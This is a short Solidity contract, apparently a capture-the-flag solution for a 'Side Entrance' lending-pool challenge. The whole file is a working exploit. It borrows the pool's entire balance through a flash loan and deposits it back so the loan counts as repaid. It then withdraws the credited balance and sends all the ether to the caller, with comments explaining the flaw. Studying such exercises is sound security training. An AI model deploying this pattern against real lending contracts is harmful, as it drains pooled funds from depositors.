// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;

    function withdraw() external;

    function flashLoan(uint256 amount) external;
}

contract SideEntranceExploit {
    ISideEntranceLenderPool pool;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
    }

    function attack() public {
        // we use the flashloan to deposit into the pool as msg.sender
        // this will keep the eth in the flashloan contract so the function won't revert
        // but we can withdraw this eth as the balances mapping is updated with the flashloan eth and our address
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.call{value: address(this).balance}("");
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    receive() external payable {}
}
